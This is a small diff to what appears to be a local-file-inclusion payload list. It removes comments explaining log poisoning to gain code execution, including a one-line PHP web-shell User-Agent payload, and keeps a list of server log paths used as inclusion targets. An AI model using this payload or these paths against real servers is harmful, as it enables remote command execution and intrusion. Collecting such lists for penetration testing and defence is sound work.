@@ -1,7 +1,3 @@
-# ---- Log Poisoning (LFI → RCE) ----
-# Step 1: Poison access.log via User-Agent:
-# User-Agent: <?php system($_GET['cmd']); ?>
-# Step 2: Include log:
 /var/log/apache2/access.log
 /var/log/nginx/access.log
 /proc/self/fd/2
